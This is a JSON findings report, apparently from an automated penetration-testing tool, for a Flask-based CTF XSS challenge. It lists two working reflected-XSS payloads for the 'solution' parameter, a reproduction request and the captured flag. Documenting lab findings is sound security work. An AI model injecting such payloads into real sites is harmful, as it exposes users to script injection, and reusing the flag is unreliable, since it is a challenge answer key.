@@ -1,0 +1,32 @@
+{
+  "meta": {
+    "created": "2026-04-12T23:01:56.719929+00:00",
+    "target": ""
+  },
+  "findings": [
+    {
+      "id": "958150a4-a2c9-424b-9f82-073fb68ba60f",
+      "timestamp": "2026-04-12T23:01:56.719837+00:00",
+      "title": "Reflected XSS in /page solution parameter \u2014 CTF Flag Extracted",
+      "severity": "critical",
+      "target": "http://172.17.0.1:43899/page",
+      "description": "The 'solution' POST parameter is reflected unsanitized into the HTML response inside a value attribute context. Two payloads successfully broke out of the attribute and executed alert('XSS'), revealing the CTF flag.\n\nWorking payloads:\n1. \"><script>alert('XSS')</script>\n2. \" onfocus=\"alert('XSS')\" autofocus\n\nThe server validates the XSS payload server-side and returns the flag when a valid XSS vector is submitted.",
+      "evidence": "POST /page solution=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E\n\nResponse body contains:\nCongratulations!<p> Here is the flag: flag{c86ef69f-51d5-4624-835e-2fa149f72065}\n\nReflected HTML: <input type=text name=solution ... value=\"\"><script>alert('XSS')</script>\">\n\nFLAG: flag{c86ef69f-51d5-4624-835e-2fa149f72065}",
+      "tool_used": "http_request",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "POST http://172.17.0.1:43899/page\nContent-Type: application/x-www-form-urlencoded\n\nsolution=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E",
+        "expected": "Response contains: flag{c86ef69f-51d5-4624-835e-2fa149f72065}"
+      }
+    }
+  ],
+  "diagrams": [
+    {
+      "id": "16631232-5e97-4f62-b8ea-ca22856ecdef",
+      "timestamp": "2026-04-12T23:02:05.409320+00:00",
+      "title": "Dalgona XSS Challenge - Application Architecture",
+      "mermaid": "flowchart TD\n  Browser[\"Browser / Attacker\"] --> Home[\"GET / - Homepage\"]\n  Home --> PageLink[\"Link to /page\"]\n  Browser --> Page[\"POST /page - XSS Challenge\"]\n  Page --> Validation[\"Server-side XSS Validation\"]\n  Validation -- \"Valid XSS payload\" --> Flag[\"Returns flag{...}\"]\n  Validation -- \"Invalid payload\" --> Error[\"Failed! Try again!\"]\n  Page --> Reflect[\"Reflects solution param in value attribute\"]\n  App[\"Flask/Werkzeug 3.1.8 Python 3.11.15\"] --> Home\n  App --> Page\n  App --> Static[\"Static assets - CSS, images\"]"
+    }
+  ]
+}
